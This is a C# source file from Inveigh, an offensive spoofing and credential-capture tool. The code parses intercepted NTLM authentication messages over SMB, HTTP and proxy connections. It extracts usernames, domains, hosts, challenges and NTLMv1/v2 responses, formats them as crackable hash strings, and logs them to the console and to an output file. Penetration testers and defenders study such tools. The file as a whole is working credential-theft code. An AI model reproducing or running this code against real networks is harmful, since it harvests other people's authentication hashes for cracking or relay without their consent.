using System;

namespace Inveigh
{
    class NTLM
    {

        public static string GetSMBNTLMChallenge(byte[] payload)
        {
            string hex = BitConverter.ToString(payload);
            hex = hex.Replace("-", String.Empty);
            int index = hex.IndexOf("4E544C4D53535000");
            string challenge = "";

            if (index > 0 && String.Equals(hex.Substring((index + 16), 8), "02000000"))
            {
                challenge = hex.Substring((index + 48), 16);
            }

            return challenge;
        }

        public static void GetNTLMResponse(byte[] payload, string sourceIP, string sourcePort, string protocol, string protocolPort, string session)
        {
            string hex = BitConverter.ToString(payload);
            hex = hex.Replace("-", String.Empty);
            int index = hex.IndexOf("4E544C4D53535000");
            string lmResponse = "";
            string ntlmResponse = "";
            int ntlmLength = 0;
            string challenge = "";
            string domain = "";
            string user = "";
            string host = "";

            if (String.IsNullOrEmpty(session))
            {
                session = sourceIP + ":" + sourcePort;
            }

            if ((String.Equals(protocol, "HTTP") || String.Equals(protocol, "Proxy") || index >= 0) && hex.Substring((index + 16), 8) == "03000000")
            {
                int ntlmsspOffset = index / 2;
                int lmLength = (int)Util.UInt16DataLength((ntlmsspOffset + 12), payload);
                int lmOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 16), payload);
                byte[] lmPayload = new byte[lmLength];
                Buffer.BlockCopy(payload, (ntlmsspOffset + lmOffset), lmPayload, 0, lmPayload.Length);
                lmResponse = BitConverter.ToString(lmPayload).Replace("-", String.Empty);
                ntlmLength = (int)Util.UInt16DataLength((ntlmsspOffset + 20), payload);
                int ntlmOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 24), payload);
                byte[] ntlmPayload = new byte[ntlmLength];
                Buffer.BlockCopy(payload, (ntlmsspOffset + ntlmOffset), ntlmPayload, 0, ntlmPayload.Length);
                ntlmResponse = BitConverter.ToString(ntlmPayload).Replace("-", String.Empty);
                int domainLength = (int)Util.UInt16DataLength((ntlmsspOffset + 28), payload);
                int domainOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 32), payload);
                byte[] domainPayload = new byte[domainLength];
                Buffer.BlockCopy(payload, (ntlmsspOffset + domainOffset), domainPayload, 0, domainPayload.Length);
                domain = Util.DataToString((ntlmsspOffset + domainOffset), domainLength, payload);
                int userLength = (int)Util.UInt16DataLength((ntlmsspOffset + 36), payload);
                int userOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 40), payload);
                byte[] userPayload = new byte[userLength];
                Buffer.BlockCopy(payload, (ntlmsspOffset + userOffset), userPayload, 0, userPayload.Length);
                user = Util.DataToString((ntlmsspOffset + userOffset), userLength, payload);
                int hostLength = (int)Util.UInt16DataLength((ntlmsspOffset + 44), payload);
                int hostOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 48), payload);
                byte[] hostPayload = new byte[hostLength];
                Buffer.BlockCopy(payload, (ntlmsspOffset + hostOffset), hostPayload, 0, hostPayload.Length);
                host = Util.DataToString((ntlmsspOffset + hostOffset), hostLength, payload);

                if (String.Equals(protocol, "SMB"))
                {

                    try
                    {
                        challenge = Program.smbSessionTable[session].ToString();
                    }
                    catch
                    {
                        challenge = "";
                    }

                }
                else if (!String.Equals(protocol, "SMB"))
                {

                    try
                    {
                        challenge = Program.httpSessionTable[session].ToString();
                    }
                    catch
                    {

                        try
                        {
                            //need better better method of tracking challenges when source port changes between challenge and response 
                            int newSourcePort = Int32.Parse(sourcePort) - 1;
                            string newSession = sourceIP + ":" + newSourcePort;
                            challenge = Program.httpSessionTable[newSession].ToString();
                        }
                        catch
                        {
                            challenge = "";
                        }

                    }

                }

                if (ntlmLength > 24)
                {
                    NTLMOutput("NTLMv2", user, domain, challenge, ntlmResponse, sourceIP, host, protocol, protocolPort, sourcePort, null);
                }
                else if (ntlmLength == 24)
                {
                    NTLMOutput("NTLMv1", user, domain, challenge, ntlmResponse, sourceIP, host, protocol, protocolPort, sourcePort, lmResponse);
                }
                else if (ntlmLength == 0)
                {

                    lock (Program.outputList)
                    {
                        Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) NTLM null response from {5}({6}):{7}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
                    }

                }

            }

        }

        public static void NTLMOutput(string version, string user, string domain, string challenge, string ntlmResponse, string sourceIP, string host, string protocol, string protocolPort, string sourcePort, string lmResponse)
        {
            string challengeResponse;

            if (String.Equals(version, "NTLMv2"))
            {
                challengeResponse = user + "::" + domain + ":" + challenge + ":" + ntlmResponse.Insert(32, ":");
            }
            else
            {
                challengeResponse = user + "::" + domain + ":" + lmResponse + ":" + ntlmResponse + ":" + challenge;
            }

            lock (Program.outputList)
            {

                if (String.Equals(protocol, "SMB") && Program.enabledSMB || !String.Equals(protocol, "SMB"))
                {

                    if (Program.enabledMachineAccounts || (!Program.enabledMachineAccounts && !user.EndsWith("$")))
                    {

                        if (!String.IsNullOrEmpty(challenge))
                        {

                            if (Program.enabledConsoleUnique && Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, ",", host, ",", domain, "\\", user)))
                            {
                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) {3} captured for {4}\\{5} from {6}({7}):{8}:", DateTime.Now.ToString("s"), protocol, protocolPort, version, domain, user, sourceIP, host, sourcePort));
                                Program.outputList.Add("[not unique]");
                            }
                            else
                            {
                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) {3} captured for {4}\\{5} from {6}({7}):{8}:", DateTime.Now.ToString("s"), protocol, protocolPort, version, domain, user, sourceIP, host, sourcePort));
                                Program.outputList.Add(challengeResponse);
                            }

                            if (Program.enabledFileOutput && (!Program.enabledFileUnique || !Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, ",", host, ",", domain, "\\", user))))
                            {

                                lock (Program.ntlmv2FileList)
                                {
                                    Program.ntlmv2FileList.Add(challengeResponse);
                                }

                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) {3} written to {4}", DateTime.Now.ToString("s"), protocol, protocolPort, version, String.Concat(Program.argFilePrefix, "-NTLMv2.txt")));
                            }

                            if (!Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, ",", host, ",", domain, "\\", user)))
                            {

                                lock (Program.ntlmv2UsernameList)
                                {
                                    Program.ntlmv2UsernameList.Add(String.Concat(sourceIP, ",", host, ",", domain, "\\", user));
                                }

                                lock (Program.ntlmv2UsernameFileList)
                                {
                                    Program.ntlmv2UsernameFileList.Add(String.Concat(sourceIP, ",", host, ",", domain, "\\", user));
                                }

                            }

                            lock (Program.ntlmv2List)
                            {
                                Program.ntlmv2List.Add(challengeResponse);
                            }

                        }
                        else
                        {

                            lock (Program.outputList)
                            {
                                Program.outputList.Add(String.Format("[!] [{0}] {1}({2}) {3} challenge missing for {4}\\{5} from {6}({7}):{8}:", DateTime.Now.ToString("s"), protocol, protocolPort, version, domain, user, sourceIP, host, sourcePort));
                                Program.ntlmv2List.Add(challengeResponse);
                            }

                        }

                    }
                    else
                    {

                        lock (Program.outputList)
                        {
                            Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) NTLMv2 ignored for {3}\\{4} from {5}({6}):{7}:", DateTime.Now.ToString("s"), protocol, protocolPort, version, domain, user, sourceIP, host, sourcePort));
                            Program.outputList.Add("[machine account]");
                        }

                    }

                }
                else
                {

                    lock (Program.outputList)
                    {
                        Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) {3} ignored for {4}\\{5} from {6}({7}):{8}:", DateTime.Now.ToString("s"), protocol, protocolPort, version, domain, user, sourceIP, host, sourcePort));
                        Program.outputList.Add("[capture disabled]");
                    }

                }

            }

        }

    }

}
